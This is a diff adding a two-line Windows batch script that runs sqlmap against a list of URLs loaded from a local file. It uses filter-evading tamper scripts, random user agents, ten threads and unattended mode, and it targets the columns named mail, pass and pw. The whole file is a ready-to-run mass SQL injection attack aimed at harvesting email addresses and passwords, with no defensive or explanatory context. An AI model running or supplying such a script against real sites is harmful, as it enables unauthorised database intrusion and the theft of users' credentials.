@@ -1,0 +1,2 @@
+sqlmap.py -v 1 --beep --eta --hex --batch --tamper=space2plus,randomcase,space2comment --level=1 --risk=1 --no-escape --random-agent --time-sec=5 --timeout=240 --thread=10 --answers=quit=n,crack=n --technique=EUSQ --retries=5 --check-internet -m "C:\Users\Anonim\Desktop\SqlMap-bat\url for scan.txt" -C mail,pass,pw --output-dir=C:\Users\Anonim\Desktop\SqlMap-bat\rusult\
+pause
